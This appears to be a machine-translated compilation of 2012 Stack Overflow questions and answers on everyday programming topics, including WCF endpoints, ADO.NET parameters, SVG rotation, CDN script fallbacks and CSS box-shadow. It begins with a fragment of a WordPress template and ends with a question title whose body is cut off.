            </div><!-- #author-avatar -->
            <div id="author-description">
                <h2><?php printf( __( 'About %s', 'yourthemesname' ), get_the_author() ); ?></h2>
                <?php the_author_meta( 'description' ); ?>
            <div id="author-link">
                <a href="<?php echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>" rel="author">
                    <?php printf( __( 'View all posts by %s <span class="meta-nav">&rarr;</span>', 'yourthemesname' ), get_the_author() ); ?>
                </a>
            </div><!-- #author-link -->
        </div><!-- #author-description -->
    </div><!-- #author-info -->
<?php endif; ?> 
```

# iphone - 如何在iphone中使用api在foursquare中发布照片

> ID：11583876
> 
> 赞同：1
> 
> 时间：2012-07-20T17:01:23.153
> 
> 标签：iphone, ios, ipad, foursquare

我想将照片发布到 Foursquare。我已经集成了 Foursquare，并且可以访问用户的信息，但除了个人资料图片之外，我不知道如何发布图像。请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T22:29:08.703

查看foursquare的照片/添加端点文档：[https ://developer.foursquare.com/docs/photos/add](https://developer.foursquare.com/docs/photos/add)

# javascript - domparser 删除节点不起作用

> ID：11583881
> 
> 赞同：0
> 
> 时间：2012-07-20T17:01:43.160
> 
> 标签：javascript

下面是代码片段：

```
var tmpl = "<book><auth> </auth> <price> </price> </book>";
var bkTmpl  = parser.parseFromString(tmpl,'text/xml');
var bk = bkTmpl.cloneNode(); 
```

我正在删除孩子的“价格”，如下所示。Try1 和 Try2 都不起作用

尝试1：

```
var bkprice = tmpl.getElementsByTagName('price')[0];
bkTmpl .documentElement.removeChild(bkprice); 
```

尝试2

```
var bkprice = tmpl.getElementsByTagName('price');
bkTmpl.documentElement.removeChild(bkprice); 
```

对于 Try1，它会抛出错误 =>“找不到节点”

对于 Try2，它给出 => 无法转换 JavaS...DOMElement.removeChild]

谷歌几个选项，但我只看到 removeChild 删除它。但是，当我使用 document.getElementById 并使用 removeChild 函数时，它不会抱怨。我使用js变量（var tmpl）的唯一原因是我想使用xml片段作为javascript的一部分，将来可以作为ajax调用进行更改，因此不想成为HTML的一部分。我在萤火虫上看到 Try1 和 Try2 的“价格”元素正在填充

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-21T13:12:34.847

All you have to do is replace this line:

```
var bkprice = tmpl.getElementsByTagName('price')[0];
bkTmpl .documentElement.removeChild(bkprice); 
```

by

```
var bkprice = bkTmpl.getElementsByTagName('price')[0];
bkTmpl .documentElement.removeChild(bkprice); 
```

`getElementByTagName` is a method of bkTmpl and not tmpl.

Here is an [example](http://jsfiddle.net/DWCpd/)

# wcf - 以编程方式添加端点

> ID：11583882
> 
> 赞同：3
> 
> 时间：2012-07-20T17:01:45.633
> 
> 标签：wcf, wcf-endpoint

我有一个在客户端应用程序中连接的 WCF 服务。我在配置文件中使用以下内容。

```
<system.serviceModel>  
    <bindings>  
      <basicHttpBinding>  
        <binding name="MyNameSpace.TestService" closeTimeout="00:01:00" openTimeout="00:01:00"  
            receiveTimeout="00:10:00" sendTimeout="00:01:00" allowCookies="false"  
            bypassProxyOnLocal="false" hostNameComparisonMode="StrongWildcard"  
            maxBufferSize="2147483647" maxBufferPoolSize="524288" maxReceivedMessageSize="2147483647"  
            messageEncoding="Text" textEncoding="utf-8" transferMode="Buffered"  
            useDefaultWebProxy="true">  
          <readerQuotas maxDepth="32" maxStringContentLength="2147483647" maxArrayLength="16384"  
              maxBytesPerRead="4096" maxNameTableCharCount="16384" />  
          <security mode="None">  
            <transport clientCredentialType="None" proxyCredentialType="None"  
                realm="" />  
            <message clientCredentialType="UserName" algorithmSuite="Default" />  
          </security>  
        </binding>  
      </basicHttpBinding>  
    </bindings>  
    <client>  
      <endpoint address="http://localhost:9100/TestService" binding="basicHttpBinding"  
          bindingConfiguration="MyNameSpace.TestService" contract="TestService.IService" name="MyNameSpace.TestService" />  
    </client>  
</system.serviceModel> 
```

在代码中，我在此服务上调用 API，如下所示，

```
TestServiceClient client = new TestServiceClient()
client.BlahBlah() 
```

现在我想以编程方式定义端点。怎么可能呢？我从配置文件中注释掉了部分，因为我想我必须在 TestServiceClient 实例上放置一些代码来动态添加端点，但是它会在 TestServiceClient 实例化的地方引发以下异常。

> 在 ServiceModel 客户端配置部分中找不到引用合同“TestService.IService”的默认端点元素。这可能是因为没有为您的应用程序找到配置文件，或者因为在客户端元素中找不到与此合同匹配的端点元素。

我怎样才能做到这一点？此外，任何关于以编程方式添加端点的代码示例的点都将不胜感激。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-20T17:27:55.167

要以编程方式创建端点和绑定，您可以在服务上执行此操作：

```
ServiceHost _host = new ServiceHost(typeof(TestService), null);

var _basicHttpBinding = new System.ServiceModel.basicHttpBinding();
            //Modify your bindings settings if you wish, for example timeout values
            _basicHttpBinding.OpenTimeout = new TimeSpan(4, 0, 0);
            _basicHttpBinding.CloseTimeout = new TimeSpan(4, 0, 0);
            _host.AddServiceEndpoint(_basicHttpBinding, "http://192.168.1.51/TestService.svc");
            _host.Open(); 
```

您还可以在服务配置中定义多个端点，并在运行时选择要动态连接的端点。

在客户端程序上，您将执行以下操作：

```
basicHttpBinding _binding = new basicHttpBinding();
EndpointAddress _endpoint = new EndpointAddress(new Uri("http://192.168.1.51/TestService.svc"));

TestServiceClient _client = new TestServiceClient(_binding, _endpoint);
_client.BlahBlah(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:17:16.610

你可以使用：

```
TestServiceClient client = new TestServiceClient();
client.Endpoint.Address = new EndPointAddress("http://someurl");
client.BlahBlah(); 
```

请注意，您的绑定配置将不再适用，因为您没有在配置文件中使用该端点配置。你也必须覆盖它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T17:09:25.290

你可以试试：

```
TestServiceClient client = new TestServiceClient("MyNameSpace.TestService")
client.BlahBlah() 
```

如果不重新检查文件 TestService 中的命名空间是否正确？

# java - 命令行编译时无法使用包函数

> ID：11583885
> 
> 赞同：0
> 
> 时间：2012-07-20T17:02:08.747
> 
> 标签：java, core

我正在使用 apache commons IO 复制文件并将其导入为

**导入 org.apache.commons.io.FileUtils；**

但是在编译我的具有主要功能的单个类（仅用于测试公共 IO 的功能）时说 **错误：包 org.apache.commons.io.FileUtils 不存在**

> 我已将 java 类文件和包 apache 文件放在同一个文件夹中。

请告诉我如何在我通过命令行工具IDE（如Eclipse）编译的普通文件中使用apache包的功能）

谢谢！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:02:58.210

您需要在[classpath](https://stackoverflow.com/questions/5131036/how-to-use-org-apache-commons-package)中添加 apache commons.jar 和所有其他必需的 jar 。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:04:36.917

您需要将所有外部 JAR 文件添加到构建路径：

[http://www.wikihow.com/Add-JARs-to-Project-Build-Paths-in-Eclipse-%28Java%29](http://www.wikihow.com/Add-JARs-to-Project-Build-Paths-in-Eclipse-%28Java%29)

# powershell - Get-Counter：负分母？

> ID：11583887
> 
> 赞同：1
> 
> 时间：2012-07-20T17:02:14.293
> 
> 标签：powershell

我正在运行这个 Powershell 命令：

> Get-counter -Counter "\Processor(_Total)\% Processor Time" – 连续

我在[http://technet.microsoft.com/en-us/magazine/ee872428.aspx上找到的](http://technet.microsoft.com/en-us/magazine/ee872428.aspx)

我正在使用它来监视 CPU，但是在运行它大约一分钟后发生了这个错误（导致它停止）：

```
Get-Counter : A counter with a negative denominator value was detected.
At line:1 char:12
+ Get-counter <<<<  -Counter "\Processor(_Total)\% Processor Time" -Continuous
    + CategoryInfo          : InvalidResult: (:) [Get-Counter], Exception
    + FullyQualifiedErrorId : CounterApiError,Microsoft.PowerShell.Commands.GetCounterCommand 
```

是什么导致了这种情况发生？我能做些什么来防止这种情况，所以命令不会像这样中止（比如抑制错误）？

不过，我无法定期重现此内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-24T18:03:54.870

如果您的代码看起来像此[链接](http://social.technet.microsoft.com/Forums/en-ZA/winserverpowershell/thread/86d9cb3f-2a6f-480d-a633-d644c503f238)中的示例，其他人似乎也有同样的问题。不过可能是你的环境有问题。这是否发生在您拥有的每台电脑上？

powershell guy 似乎也有一些信息可以帮助您整理[Powershell guy's blog](http://blogs.technet.com/b/heyscriptingguy/archive/2011/02/02/use-powershell-to-parse-saved-performance-counter-logs.aspx)。他基本上只是添加了这个命令-EA静默继续并导入计数器。

# java - 如何使渲染循环以一致的速率运行？

> ID：11583888
> 
> 赞同：0
> 
> 时间：2012-07-20T17:02:14.080
> 
> 标签：java, rendering, frame-rate

我编写了一个基于用户输入的移动动画精灵的程序，所有这些都发生在一个`while(true)`循环中。到目前为止，我一直在为循环计时的唯一方法是`sleep(20)`在每次运行结束时通过循环。我注意到这对我的精灵的物理产生了负面影响，因为我计算重力的公式是`velocity = velocity + GRAVITY * Elapsed-Time`，并且因为循环没有以一致的速率运行，所以重力的影响也不一致。**有没有办法让循环保持一致运行或更好的计时方式，以便它实际上按计划运行？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:06:19.157

首先，确定您希望框架持续多长时间。如果您想要 30 fps，那么您将拥有

```
final long frameDuration = 1000 / 30; 
```

接下来，当你开始渲染时，存储时间，像这样

```
final long then = System.currentTimeMillis();
render(); // surely it's more than this but you get the idea
final long now = System.currentTimeMillis();

final long actualDuration = now - then;
final long sleepDuration = frameDuration - actualDuration;

if(sleepDuration > 0) {
    sleep(sleepDuration);
} else {
    throw new FrameTooLongException();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T17:15:22.460

```
velocity = velocity + GRAVITY * Elapsed-Time 
```

无论您的帧速率是否恒定，这都应该有效。诀窍是准确且一致地测量经过的时间。测量从循环中的某个点到下一个循环中的同一点所经过的时间。

# c# - 存储过程 ADO.NET 错误

> ID：11583902
> 
> 赞同：0
> 
> 时间：2012-07-20T17:03:37.773
> 
> 标签：c#, asp.net, ado.net

您好，我有一个用于注册页面的存储过程，但我需要 ADO.NET 从各种文本框中获取值。但是，我收到这样的错误：

“System.ArgumentException：不存在从对象类型 System.Web.UI.WebControls.TextBox 到已知托管提供程序本机类型的映射。”

```
public void InsertInfo()
    {
        String empdb = @"Data Source=USER-PC\SQLEXPRESS;Initial Catalog=EmployeeDB;Integrated Security=True";
        SqlConnection conn = new SqlConnection(empdb);
        SqlCommand cmd = new SqlCommand("bridge_Type", conn);
        cmd.CommandType = CommandType.StoredProcedure;

        try
        {
            conn.Open();
            cmd.Parameters.Add(new SqlParameter("@EmpID", TextBox1.Text));
            cmd.Parameters.Add(new SqlParameter("@Name", TextBox2.Text));
            cmd.Parameters.Add(new SqlParameter("@Mob2", TextBox3.Text));
            cmd.Parameters.Add(new SqlParameter("@Email", TextBox14.Text));
            cmd.Parameters.Add(new SqlParameter("@Emptype", dropdown1.SelectedValue));
            cmd.ExecuteNonQuery();
        }

        catch (System.Data.SqlClient.SqlException ex)
        {
            string msg = "Insert Error:";
            msg += ex.Message;
            throw new Exception(msg);

        }

        finally
        {
            if (conn != null)
            {
                conn.Close();
            }
        }

    }

    protected void Button1_Click(object sender, EventArgs e)
    {
        InsertInfo();
    } 
```

然后我使用这种格式从控件中添加值：

```
cmd.Parameters.Add(new SqlParameter("@EmpID", SqlDbType.Int));
cmd.Parameters("@EmpID").Value = TextBox1.Text; 
```

我收到以下错误：

```
Its showing errors for these kind of codes by appearing red line under 'Parameters'.

Non-invocable member 'System.Data.SqlClient.SqlCommand.Parameters' cannot be used like a method. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:05:35.370

试试TextBox1.Text，TextBox就是Control。Text 属性保存字符串值。

```
cmd.Parameters.Add(new SqlParameter("@EmpID", TextBox1.Text)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T17:40:24.780

你为什么不使用这种格式？

```
 cmd.Parameters.Add("@parameter", SqlDBType , size).value = TextBox1.Text 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T17:25:55.237

试试这个代码。

```
try
{
  string empdb = @"Data Source=USER-PC\SQLEXPRESS;Initial Catalog=EmployeeDB;Integrated Security=True";
  using (var conn = new SqlConnection(connString))
  {
    using (var cmd = new SqlCommand("bridge_Type",conn))
    {           
        cmd.CommandType = CommandType.StoredProcedure;           
        cmd.Parameters.AddWithValue("@EmpID",TextBox1.Text);
        cmd.Parameters.AddWithValue("@Name", TextBox2.Text);    
        cmd.Parameters.AddWithValue("@Mob2", TextBox3.Text); 
        cmd.Parameters.AddWithValue("@Email", TextBox14.Text); 
        cmd.Parameters.AddWithValue("@EmpType",dropdown1.SelectedValue); 
        conn.Open();
        cmd.ExecuteNonQuery();           
    }
  }
}
catch(Exception ex)
{
   string msg = "Insert Error:"+ ex.Message;
   throw new Exception(msg);
} 
```

确保您转换为与存储过程中的参数类型相同的类型（例如：如果 EmpID 的参数类型是 int，您可能需要将`TextBox1.Text`值转换为 int。还要检查空值。

# php - 欠款利息数据库设计

> ID：11583908
> 
> 赞同：1
> 
> 时间：2012-07-20T17:04:10.723
> 
> 标签：php, sql-server, database

我正在开发一个 Web 应用程序来管理贷款。我有一张表，其中存储了摊销时间表（此人在给定日期必须支付多少），并且我还将付款存储在同一张表中（此人的实际付款）。但是，有时该人未按时付款，在这种情况下，应为该人错过付款的每一天收取费用（欠款利息）。您认为计算欠款利息的最佳方法是什么？

我想过两种方法：

1.  运行日常存储程序以计算每笔未到期付款的利息。
2.  计算拖欠的利息，直到付款实际到期，我的意思是，从两个日期，债务和付款中获得差额，计算利息并收取费用。

有人有其他想法吗？我是金融方面的新手。我希望让自己明白

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T17:14:40.980

由于拖欠的金额是根据其他数据计算出来的，并不是特别难计算，所以没有理由存储它。只需在需要时计算即可。我认为当客户询问他欠多少钱时，您可能会需要它，并且可能需要一些报告。因此，只需在您生成对客户查询的响应和/或生成报告时计算它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-20T17:15:27.827

我建议在付款到期时计算利息，原因有两个：

*   在需要时进行计算比每天更改它更简单，即使它可能没有用；和
*   更改数据越多，错误更改数据或丢失数据的可能性就越大。

我不知道你的具体情况，但我的投票是在你真正需要的时候计算利息。

# .net - 自定义 ASP.NET 模型绑定器是否应该将传递给 Url.Action 的值转换为正确的字符串表示形式？

> ID：11583910
> 
> 赞同：1
> 
> 时间：2012-07-20T17:04:19.117
> 
> 标签：.net, asp.net-mvc-3

我有日期时间和数字的自定义模型活页夹。它们可以很好地将我的请求字符串值转换为有效的强类型值。

现在我需要`Url.Action`使用 Model Binder 来做相反的事情。我传入一个数据时间或一个数字，我需要它知道如何将其转换为字符串。

ASP.NET 模型绑定是否也应该以其他方式工作？将传递给 Url.Action 的值转换为正确的字符串表示形式？

如果没有，有没有办法做到这一点？

**编辑**

我问是因为我测试过但它不起作用但我不知道我是否遗漏了什么

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-21T14:00:40.513

> ASP.NET 模型绑定是否也应该以其他方式工作？将传递给 Url.Action 的值转换为正确的字符串表示形式？

不，模型绑定不能以其他方式工作。这就是路由基础设施的工作。

> 如果没有，有没有办法做到这一点？

我可以看到的一个想法是创建一个自定义`RouteValueDictionary`类。

```
public class CustomRouteValueDictionary: RouteValueDictionary
{
    public CustomRouteValueDictionary(object values)
    {
        foreach (var prop in values.GetType().GetProperties(BindingFlags.Instance | BindingFlags.Public))
        {
            var value = prop.GetValue(values, null);

            if (value.GetType() == typeof(DateTime))
            {
                value = ((DateTime)value).ToString("yyyy/MM/dd");
            }

            Add(prop.Name, value);
        }
    }
} 
```

有内置的 Action 方法`UrlHelper`将其`RouteValueDictionary`作为参数，您可以将其传递`CustomRouteValueDictionary`给它。

前任。

**而不是这个**

```
@Url.Action("SomeAction", "SomeController", new { dt = DateTime.Now })

Output: /SomeController/SomeAction?dt=07%2F21%2F2012%2019%3A21%3A59 
```

**您可以使用**

```
@Url.Action("SomeAction", "SomeController", new 
   CustomRouteValueDictionary(new { dt = DateTime.Now }))

Output: /SomeController/SomeAction?dt=2012-07-21 
```

您甚至可以创建自定义扩展方法，直接接受匿名对象并`CustomRouteValueDictionary`在其中创建。

# codeigniter - 在 CodeIgniter 中设置在特定时间过期的 cookie

> ID：11583913
> 
> 赞同：0
> 
> 时间：2012-07-20T17:04:24.373
> 
> 标签：codeigniter, cookies

我需要在 CodeIgniter 中设置一个 cookie，该 cookie 在设置的当天午夜到期。根据他们的 cookie 文档，您以秒为单位设置过期时间；您无法提供具体的日期和时间。

有没有其他方法可以设置 cookie 并提供特定的日期和时间，或者我真的需要计算从现在到今晚午夜的秒数差异吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T18:07:16.190

您必须计算时间，即 cookie 过期前的秒数。这比你想象的要容易：

```
$expire = strtotime('midnight') - time(); 
```

如果您加载了日期助手，请替换`time()`为`now()`.

# mysql - SQL - 数据库设计，需要建议

> ID：11583914
> 
> 赞同：1
> 
> 时间：2012-07-20T17:04:33.700
> 
> 标签：mysql, sql

我正在建立网站，每个用户都有不同的课程

```
+----+-----------+---------+
| id | subject   | user_id |
+----+-----------+---------+
|  1 | Math 140  |       2 |
|  2 | ART 240   |       2 |
+----+-----------+---------+ 
```

然后每个班级都会有一堆家庭作业文件，班级论文文件等等。在这里我需要你的帮助。什么是更好的方法：建立一个这样的表：

```
+----+-----------+--------------------------------------------------+--------------+
| id | subject   | Homework                                         | Class-Papers |
+----+-----------+-----------------------------------------------------------------+
|  1 | Math 140  |  www.example.com/subjects/Math+140/file_name.pdf |   bla-bla    |
|  2 | Math 140  |  www.example.com/subjects/Math+140/file_name.pdf |   bla-bla    |
|  3 | Math 140  |  www.example.com/subjects/Math+140/file_name.pdf |   bla-bla    |
|  4 | ART 240   |  www.example.com/subjects/ART +240/file_name.pdf |   bla-bla    |
|  5 | ART 240   |  www.example.com/subjects/ART +240/file_name.pdf |   bla-bla    |
+----+-----------+--------------------------------------------------+--------------+ 
```

而不仅仅是在我想显示内容时将其分开，或者为每个主题构建一个表格，而不仅仅是加载必要的表格？

或者，如果您可以提出更好或更常见/有用/高效的建议，请继续。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:09:38.113

在尝试之前，您应该阅读规范化和关系设计。

这是一个一对多的关系——这样建模。

每个主题的桌子都很疯狂。您必须为每个主题添加一个新表。

一个更好的解决方案将可以通过添加数据来添加新的主题。这就是关系模型的全部意义所在。

不用担心桌子；先用自然语言考虑一下。

一个主题（微积分）可以有许多课程（微分、积分、多变量）。

一门课程（微积分）可以有很多部分（周一上午 9 点到 10 点，数学楼 2 室）。

一个学生（名字、姓氏、学生证）可以注册零个或多个 SECTION。给定学生的 SECTION 列表是一个 TRANSCRIPT。

每个学生每学期有一份成绩单（2012 年秋季）。

一个 SECTION 可以有零个或多个 ASSIGNMENT。

这些是解决这个简单问题所需的表。在开始编写 SQL 之前，请先考虑名称以及它们之间的关系。你会很高兴你做到了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:09:55.727

我绝对不会为每个主题创建单独的表格。如果你这样做了，那么如果你想要一个像“列出学生 X 的所有作业”这样的查询，你将不得不根据学生注册的科目访问不同的表。更糟糕的是，任何时候有人添加一个新科目，你都会有创建一个新表。如果以后您决定需要一个新的作业属性，而不是更新一个表，您将不得不更新这些主题表中的每一个。这只是周围的坏消息。

# c++ - Doxygen 注释在 C++ 头文件中带有未声明的函数

> ID：11583920
> 
> 赞同：1
> 
> 时间：2012-07-20T17:05:08.943
> 
> 标签：c++, header, doxygen

我有一个代码，其中定义了 .cpp 文件中未在 .h 文件中声明的成员函数。与我的预期相反，它编译没有任何问题。

我想用 Doxygen 生成一些文档，但是我在头文件中未声明的成员函数之前添加的注释似乎没有被 Doxygen 识别。

除了在头文件中定义函数之外，这个问题是否有任何解决方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T16:31:03.890

> 我有一个代码，其中定义了 .cpp 文件中未在 .h 文件中声明的成员函数。与我的预期相反，它编译没有任何问题。

你是这个意思吗？

```
// Foo.h
class Foo
{
  void bar ();
  // no method "meh".
};

// Foo.cpp
int Foo::meh (const std::string& message)
{
   // ...
}; 
```

因为那不应该编译。

如果你是这个意思：

```
// Foo.h
void bar ();
// no function "meh".

// Foo.cpp
int meh (const std::string& message)
{
   // ...
} 
```

那么这完全没问题（自由函数不需要在头文件中声明）。

* * *

> 我想用 Doxygen 生成一些文档，但是我在头文件中未声明的成员函数之前添加的注释似乎没有被 Doxygen 识别。

这取决于您的 Doxygen 配置。确保将 INPUT_PATTERNS 设置设置为包括源文件和头文件。还要确保独立的函数命令明确引用某个符号（例如，使用`@fn meh`命令来记录`meh`函数）。

# c# - 我们如何计算旋转图像的正确 x 和 y 值？

> ID：11583922
> 
> 赞同：0
> 
> 时间：2012-07-20T17:05:17.867
> 
> 标签：c#, svg, rotation, inkscape

将SVG`image`元素映射到 html。

inkscape 中的图像**逆时针旋转 50 度**：![在此处输入图像描述](../Images/41a7b1079ffb535368faf06386de0b3f.png)

```
<image
   y="178.3712"
   x="-212.40982"
   id="image3002"
   xlink:href="..path"
   height="369"
   width="360"
   transform="matrix(0.64278761,-0.76604444,0.76604444,0.64278761,0,0)" /> 
```

[根据这个数学逻辑](http://en.wikipedia.org/wiki/Transformation_matrix#Examples_in_2D_graphics)计算 x & y ：

```
 X = -212.40982, Y = 178.3712

   x = X * 0.64278761 - Y * 0.76604444;

   y = X * 0.76604444 + Y * 0.64278761; 
```

当我在 html 中映射图像时计算 x 和 y 后，它看起来： ![在此处输入图像描述](../Images/0b701c06b48e74e51fcf2f089f5e41f6.png)

现在可以请任何人帮助我，请解释一下这里出了什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T21:05:21.483

您希望图像保持在文档的范围内，对吗？您当前的解决方案不起作用，因为图像围绕 的中心旋转 50º `(0, 0)`，但您的图像放置在`(-212.40982, 178.3712)`。

让我们考虑一个不同的算法。如果图像位于`(0, 0)`，则旋转将以图像的左上角为中心。旋转将导致图像的一部分超出范围。我们需要弄清楚有多少超出范围，并相应地移动图像。

可以使用以下分段函数计算在 x 方向上的调整量：

*   `h × sin(θ)`为了`0 < θ ≤ π/2`
*   `h × sin(θ) − w × cos(θ)`为了`π/2 < θ ≤ π`
*   `−w × cos(θ)`为了`π < θ ≤ 3π/2`
*   `0`为了`3π/2 < θ ≤ 2π`

其中`θ`是旋转角度，`w`分别`h`是图像的宽度和高度。

y 方向上的调整量简单地向左移动`π/2`。这个分段函数可以通过使用 4 个方程的最大值来实现所有角度。

为了说明这个例子，请查看这个 Fiddle：http: [//jsfiddle.net/XMkYS/](http://jsfiddle.net/XMkYS/)

您可以使用 , 应用转换`rotate`，然后`translate`固定图像位置。在您的情况下，`<image>`标签变为：

```
<image
   y="0"
   x="0"
   id="image3002"
   xlink:href="..path"
   height="369"
   width="360"
   transform="translate(0, 275.775999522832) rotate(-50)" /> 
```

进一步阅读：[http ://www.w3.org/TR/SVG/coords.html#TransformAttribute](http://www.w3.org/TR/SVG/coords.html#TransformAttribute)

# javascript - 如何从 CDN 加载 javascript，并在

> ID：11583930
> 
> 赞同：6
> 
> 时间：2012-07-20T17:05:49.577
> 
> 标签：javascript, external, cdn, fallback, head.js

我想使用[Head JS](http://headjs.com/)为我的页面动态加载所有其他脚本。我打算使用由[CDNJS](http://cdnjs.com "cdnjs - 缺失的 cdn")托管的版本来利用更好的缓存、减少的延迟等。

我没有理由认为 CDNJS 会走向任何地方，但即使对于像 jQuery 这样的 Google CDN 托管文件，我也喜欢包含一个后备。但是，当我使用 jQuery 时，文件包含在`<body>`标签的末尾。由于 Head JS 的性质，我需要将它包含在`<head>`我的页面中。

在`<body>`我会使用这样的两行：

```
<script src="http://cdnjs.cloudflare.com/ajax/libs/headjs/0.96/head.min.js"></script>
<script> window.head || document.write('<script src="js/libs/head-0.96.min.js"><\/script>') </script> 
```

我可以在头部使用同一组行作为后备吗？不会`document.write()`覆盖我的整个页面？`<head>`由于浏览器解析 DOM 的顺序，当它们存在时，脚本不会以不同的方式加载吗？

我对此还是很陌生，所以任何指导都会非常有帮助！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:24:35.750

您可能已经知道，您不会测试`window.jQuery`head.js 中包含的一些功能。

此外，您是对的，您可能不想在`document.write()`这里使用两次。

而不是`document.write()`，试试这个：

```
function appendScript(url) {
  var head = document.getElementsByTagName('head')[0];
  var theScript = document.createElement('script');
  theScript.type = 'text/javascript';
  theScript.src = url;
  theScript.onreadystatechange = callback;
  theScript.onload = callback;
  head.appendChild(theScript);
} 
```

对于 url，请使用您的本地后备。

# google-fusion-tables - 尝试插入（创建）新表时 401 未授权

> ID：11583932
> 
> 赞同：1
> 
> 时间：2012-07-20T17:06:04.963
> 
> 标签：google-fusion-tables

我正在尝试使用 google-api-services-fusiontables-v1-rev1-1.7.2-beta api 从我的 Android 应用程序创建新表。我正在使用任务示例中描述的帐户管理器，并且可以使用范围（AUTH_TOKEN_TYPE）作为“fusiontables”成功获取令牌。但是，当尝试使用该服务插入新表时，我收到 401 未经授权的错误。//创建列

```
 List <Column> coulmns = createColumn(3,basicCoulmn);  

//Create the table

Table table = createTable("TestTable","fusiontables#table","Description", coulmns);

//Call the service

service.table().insert(table).execute(); 
```

这是错误：

com.google.api.client.googleapis.json.GoogleJsonResponseException: 401 Unauthorized

{

“代码”：401，

“错误”：[

```
{

  "domain": "global",

  "location": "Authorization",

  "locationType": "header",

  "message": "Invalid Credentials",

  "reason": "authError"

} 
```

],

“消息”：“无效的凭据”

}

你能建议我做错什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T23:53:13.510

如果不使用`fusiontables`for `AUTH_TOKEN_TYPE`，会发生什么情况`oauth2:https://www.googleapis.com/auth/fusiontables`？

# php - 用户上传电子邮件地址列表的最佳格式

> ID：11583946
> 
> 赞同：0
> 
> 时间：2012-07-20T17:07:02.230
> 
> 标签：php, excel, csv, user-input

我正在构建一个网络应用程序，规范的一部分是能够通过上传电子邮件地址列表来批量创建用户。我一直在权衡几个不同的选择，并希望从有过去经验的人那里得到一些意见：

我可以让他们创建一个电子表格并将其保存为 csv，但我担心用户（技术上不倾向于）会搞砸它。我可以告诉他们只创建一个用逗号分隔的列表，但这需要他们手动完成。我可以让他们上传电子表格并尝试解析 excel 文件，但据我所见，这很困难。

有没有人有这方面的经验，特别是在 PHP 中易于解析且最不可能给非技术用户带来问题的格式？

*编辑*要清楚，这是一个简单的电子邮件地址列表，仅此而已。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:08:33.370

[CSV - 逗号分隔值](http://en.wikipedia.org/wiki/Comma-separated_values)，如果您还将在电子邮件地址中包含姓名

在 Excel 或文本编辑器中制作很容易，PHP 使用[`fgetcsv()`](http://us2.php.net/manual/en/function.fgetcsv.php).

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-20T17:08:54.947

它只是电子邮件地址吗？没有比“文本文件中每行一个电子邮件地址”更简单的了。如果不仅仅是电子邮件，那么 csv。“将数据输入Excel，文件->另存为csv”

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-20T17:16:09.640

更好的方法是让您的应用程序能够处理多种格式：每行 1 封电子邮件、逗号分隔的电子邮件、电子邮件地址 + 姓名等，以及上述的任意组合。将更多智能放入您的代码中，您将不必依赖（非技术）用户来完全正确地做事。

# css - Boxshadow 插图不起作用

> ID：11583947
> 
> 赞同：5
> 
> 时间：2012-07-20T17:07:07.453
> 
> 标签：css, insets

我在我的画廊中的图像上使用 box shadow CSS 功能，但不知何故 inset 参数不起作用。我尝试了 z-index 并尝试在不同的地方放置代码，但它仍然无法正常工作。

[在此处](http://www.wrzesien39.pl/media/galeria/jankesi-nadchodza-henrykow-lubanski-2012)访问网站。

代码

```
box-shadow:#000000 0 1px 3px, rgba(255, 255, 255, 0.3) 0 0 0 1px inset, rgba(255, 255, 255, 0.5) 0 1px 0 0 inset; 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-20T17:41:16.870

它与您的语法无关。这只是`img`元素的特性，而不是`box-shadow`属性。

考虑看这个例子： http: [//jsfiddle.net/YhePf/](http://jsfiddle.net/YhePf/) - 如果你禁用在浏览器中显示图像 - 你会看到，而不是图像，将有一个绿色块`box-shadow`应用到它。

**编辑：**换句话说，应用了 inset`box-shadow`属性**，**但它不能被看到，因为它位于图像本身的下方（就像 background-color 属性一样）。我可以用另一个小提琴来证明这一点。它与我之前在`padding`物业中的不同。见这里： http: [//jsfiddle.net/YhePf/6/](http://jsfiddle.net/YhePf/6/) - 查看红色 2px 阴影和绿色背景

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:36:18.443

我想你可能只是错过了第一个阴影的传播半径值。:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T17:42:05.887

我认为有一个问题，因为不能将嵌入框阴影应用于图像。您需要的效果可以通过边框属性轻松实现。如果你想使用插入框阴影，请在 div 上应用它。有关更多详细信息，请查看 [http://jordandobson.com/_expirements/css/vignette/](http://jordandobson.com/_expirements/css/vignette/)

# r - 使用 ggplot 挑选出一个特定的样本以获得美学

> ID：11583948
> 
> 赞同：3
> 
> 时间：2012-07-20T17:07:08.363
> 
> 标签：r, plot, ggplot2

